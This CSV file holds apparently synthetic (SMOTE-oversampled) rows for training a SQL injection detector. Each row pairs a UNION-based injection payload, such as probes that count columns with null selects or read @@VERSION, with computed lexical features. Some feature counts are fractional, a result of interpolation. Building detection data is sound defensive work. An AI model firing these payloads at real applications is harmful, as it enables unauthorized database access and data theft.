id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000136,attack,union,"-8651""  )   where 8391  =  8391 union all select 8391,8391#",nearest_attack_euclidean,R000087,0.34123621099539864,58.874119192612646,25.62235757783794,4.045503116386158,20.258808073873535,18.615311118739115,14.251761614774708,5.748238385225293,0.3444364148740205,0.3158448194486717,0.24214385347023104,0.09757491220707669,0.0,1.0,0.8741191926126467,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.874119192612647,1.8741191926126466,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000137,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000041,1.750361222336747,58.87928388318613,16.484910485398267,3.249021189929988,38.0,1.0,10.909462912389596,8.969820970796533,0.6483657178755923,0.01706225573356826,0.1826799968588568,0.15189202953198275,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4849104853982662,0.4849104853982662,0.0,5.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000138,attack,union,"-3300' union all select 8979,8979,8979,8979,8979,8979--",nearest_attack_euclidean,R000134,0.6406534912715336,55.15958160351019,19.478744810530575,3.7826728616983027,14.000000000000002,27.36167358595923,4.638326414040767,9.159581603510192,0.2538200836204082,0.4962414812758027,0.0839187098565589,0.16601972524723013,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.1595816035101918,0.15958160351019177,0.0,4.840418396489809,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.15958160351019146,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000139,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000043,0.17060771544054962,59.862531153401875,21.884995846213084,3.956108392955586,14.000000000000002,28.6900249227215,8.0,9.172506230680375,0.2345223462786014,0.47836935367506095,0.13401276930205794,0.15309553074427973,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,5.172506230680375,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000140,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000034,0.1534388039631467,70.0,14.943205635863094,3.0423232514349694,50.22717745654762,1.0,7.7728225434523734,11.0,0.717531106522109,0.014285714285714263,0.11104032204931963,0.15714285714285714,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.9432056358630934,0.0,0.0,8.056794364136907,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.9432056358630936,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000141,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000115,1.230914655270948,75.77174697059729,26.006691375568398,4.056345194682558,30.4899629366474,20.275092658381496,14.7516728438921,10.2550185316763,0.4076191810218303,0.26221910101990853,0.19539814923446808,0.13476356872379314,2.5033456877841993,0.0,2.7516728438920994,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.2483271561079006,4.503345687784199,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.7516728438920997,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7516728438920994
SMOTE_000142,attack,union,"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",nearest_attack_euclidean,R000073,0.9397858984833795,57.805139735738905,20.84154192072167,3.6342618215228173,14.000000000000002,29.122055894295563,5.122055894295561,9.561027947147782,0.24356029194395953,0.504382982261697,0.08685105321490916,0.16520567257943436,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.2805139735738903,1.0,0.0,5.280513973573891,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.2805139735738904,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000143,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,0.7961341229795703,65.79267212174386,23.0,3.8564725221778717,31.682753947901844,12.93922968686656,13.170688486975461,8.0,0.4809599618416052,0.19740212359848439,0.20003916793379167,0.12159874662611866,1.0,0.0,2.2073278782561347,0.0,0.0,1.0,0.0,0.7926721217438653,0.0,0.0,3.0,3.2073278782561347,1.0,0.0,1.0,0.0,0.0,1.0,0.7926721217438653,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000144,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000084,0.0003281515245543261,70.999267375018,16.0,3.1143737101086177,49.999674388896885,1.0,7.999674388896883,11.999918597224221,0.7042284218220761,0.01408467347228129,0.11267213598626416,0.16901476871937843,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.9999185972242208,8.140277577911581e-05,0.0,7.999918597224221,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.999918597224221,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000145,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R000119,0.1959117025950024,59.68855200097141,20.077861999757147,3.6274327602680305,14.000000000000002,23.688552000971413,14.0,8.0,0.23463103332928578,0.3966630571532651,0.23463103332928578,0.1340748761881633,0.0778619997571467,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,3.922138000242853,1.0,0.07786199975714664,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000146,attack,union,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",nearest_attack_euclidean,R000148,0.22576069776172716,80.12054705071388,27.698632373215286,4.079812099542996,25.0,24.482188202855543,21.638358847858342,9.0,0.31204059812990137,0.305439318141968,0.27018546840136615,0.11233461532676449,0.0,0.939726474643057,3.0,0.0,0.0,1.0,0.0,1.9397264746430571,0.0,0.0,2.1205470507138857,4.0,0.0,0.9397264746430569,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000147,attack,union," select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000023,0.057715180073717065,73.0,32.74432554187303,4.393119398931526,42.0,3.0,17.0,11.0,0.5753424657534246,0.0410958904109589,0.2328767123287671,0.1506849315068493,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0000000000000004,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000148,attack,union," select * from users where id  =  1. union select null,version  (    )   -- 1",nearest_attack_euclidean,R000019,0.19609165728997197,76.58427884756681,25.415721152433193,3.849008911928959,42.75283654270042,2.415721152433191,23.415721152433193,8.0,0.558144248888413,0.03158611945355816,0.3058052144981749,0.104464417159854,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000149,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000051,1.5224222503398466,71.90905946042153,22.0,3.809816858676676,42.18879667404071,9.0,13.188796674040708,7.531466112340118,0.5877353974075357,0.1261969358690742,0.1811008262738522,0.10496684044953786,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.5314661123401181,0.0,0.0,4.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.5314661123401179,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000150,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000112,1.2606678678906187,65.0,22.0,3.79950232466787,39.0,9.0,10.0,7.0,0.6,0.13846153846153847,0.15384615384615385,0.1076923076923077,0.6601834904906827,0.33981650950931713,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,4.0,1.0,0.6601834904906827,0.3398165095093172,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000151,attack,union,"-4205' union all select 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986#",nearest_attack_euclidean,R000094,0.03424569979351597,73.84135374909519,21.96827074981904,3.5255899611735138,14.000000000000002,43.87308299927616,4.0,11.96827074981904,0.18962417695116865,0.5941223221673027,0.05417833627176247,0.1620751646097663,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.96827074981904,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000152,attack,union," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000005,0.15757771014223157,73.23077802853875,31.855763732163275,4.34209922218914,42.0,4.0,17.230778028538758,10.0,0.5737032509388419,0.05463840485131827,0.2350623320815441,0.1365960121282957,0.0,0.028847253567344522,2.0,0.0,1.0,1.0,0.0,0.057694507134689044,0.0,0.0,1.0000000000000004,5.9423054928653105,0.0,0.02884725356734441,1.0,0.028847253567344522,0.0,1.0,0.0288472535673443,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000153,attack,union,"1%'   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000105,0.8233357452653257,66.04631927629256,16.782405765979103,3.2227009335421855,40.61113080825077,1.0,14.0,10.435188468041796,0.6132222445723935,0.015245038285654017,0.21343053599915565,0.15810218114279684,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.7824057659791025,0.0,5.652782702062693,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000154,attack,union,"1'+  (  select lang where 4191  =  4191 union all select null,null#",nearest_attack_euclidean,R000097,1.7485434107743318,67.91952724355056,25.37929086532584,3.9203563859927346,31.48283653869665,12.218345352426955,18.218345352426955,6.0,0.46492051483480534,0.17918092005638134,0.26753974258259733,0.08835882252621602,1.0,0.0,0.4597636217752792,0.0,0.0,1.0,0.0,1.4597636217752792,0.0,0.0,0.540236378224721,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.5402363782247208,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.540236378224721
SMOTE_000155,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000129,0.5610050983699136,67.02219903545785,22.0,3.743844882890265,14.000000000000002,34.41775922836628,8.0,10.60443980709157,0.20981613460802157,0.5122521582518562,0.11989493406172662,0.1580367730783957,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,6.60443980709157,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000156,attack,union,"-4230""   )    )     )   union all select 6962,6962,6962,6962,6962,6962#",nearest_attack_euclidean,R000106,0.5163530717439714,68.59201132421722,22.0,3.674685516571135,14.000000000000002,27.03680452968689,17.03680452968689,10.518402264843445,0.2049669456155527,0.3941438015538413,0.24773884039987512,0.1531504124307308,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.7592011324217225,0.0,0.0,4.7592011324217225,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000157,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000100,0.8024641084864245,59.37719796214388,22.803257433979446,3.891775925956316,30.96742566020555,9.0,14.81954460387667,4.590227698061665,0.5196742566020555,0.15188467329992178,0.25185634472958746,0.07658472536843529,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.8032574339794449,0.0,0.0,0.7869702640822203,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.803257433979445,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000158,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000068,0.6738644537587151,66.20598443800758,16.199335062443602,3.2103686512764376,37.20265975022559,1.0,17.20265975022559,10.800664937556398,0.5623014592151176,0.015153044756229417,0.2592405640905293,0.16330493193812357,0.0,1.0,2.0,0.0,0.0,0.0,0.0,2.8006649375563972,0.19933506244360275,0.0,4.800664937556397,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000159,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,0.8487108636368287,71.77824377726105,20.592747925753685,3.610535915159453,14.000000000000002,33.18549585150737,14.0,10.592747925753686,0.19532041111247092,0.462045283596459,0.19532041111247092,0.14731389417859914,0.29637396287684276,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,6.296373962876843,1.0,0.29637396287684276,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000160,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000089,0.13300197578516829,81.57370799050244,16.0,3.0743152198015,50.0,1.0,17.65896639240195,12.914741598100488,0.6131318657704907,0.012262637315409802,0.21629846378649287,0.15830703312760663,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.914741598100487,0.0,0.0,8.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000161,attack,union,"1%' union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000063,1.0629607644049945,71.72711773635588,16.0,3.057366424084686,52.90847094542352,1.0,5.091529054576482,12.72711773635588,0.7375089104669945,0.01394226961338893,0.07114272710956245,0.17740609281005415,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.2728822636441207,0.7271177363558793,0.0,8.72711773635588,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.2728822636441207,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000162,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000110,0.5228829974598217,60.82681853134763,21.653637062695253,3.761708764864924,14.000000000000002,24.0,14.0,8.826818531347627,0.23017063949757738,0.39457823913870405,0.23017063949757738,0.14508048186614114,0.0,0.8268185313476265,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,4.0,1.0,0.0,0.8268185313476264,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000163,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000034,0.12498838589820001,70.0,14.953736370994584,3.0438476284778844,50.185054516021665,1.0,7.814945483978339,11.0,0.7169293502288809,0.014285714285714263,0.11164207834254769,0.15714285714285714,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.9537363709945845,0.0,0.0,8.046263629005416,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.9537363709945847,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000164,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,0.6546494091060774,64.32559046960769,21.33720476519616,3.8912133295607156,16.191830973775026,29.302361878430737,8.505807147794236,10.325590469607686,0.2536975401565874,0.45352701817668406,0.13272956894067184,0.16004587272605675,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,5.325590469607685,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000165,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000129,0.6961295213347779,62.12902315435176,21.76612789429397,3.7281402245328654,14.000000000000002,29.19353473152764,9.40323263423618,9.53225578858794,0.22605850330331342,0.46658969918485294,0.15423401321325372,0.15311778429857995,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.23387210570603,0.0,0.0,5.298383682881911,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000166,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000061,1.198434594690272,79.49078178253838,22.490781782538384,3.668364151288293,47.0,9.0,14.0,9.490781782538383,0.5912869076298569,0.11322515252486623,0.17612801503868078,0.11935992480659602,0.49078178253838356,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,6.0,1.0,0.49078178253838356,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000167,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000052,0.5389620668708045,65.82922857549968,20.0,3.620370237447848,14.000000000000002,23.219485716999788,18.0,10.609742858499894,0.21296569609567026,0.3522887343349629,0.27381303783729033,0.16093253173207644,0.8048714292499471,0.0,3.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,3.804871429249947,3.0,0.8048714292499471,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000168,attack,union,"-9136%""  )   union all select 3081,3081,3081,3081,3081,3081,3081#",nearest_attack_euclidean,R000151,0.2034958443254746,65.28216065404077,23.0,3.933562547965156,14.000000000000002,32.28216065404076,8.0,11.0,0.21450384634190178,0.4943837907655173,0.12257362648108672,0.16853873641149425,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.9294598364898098,0.0,6.07054016351019,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
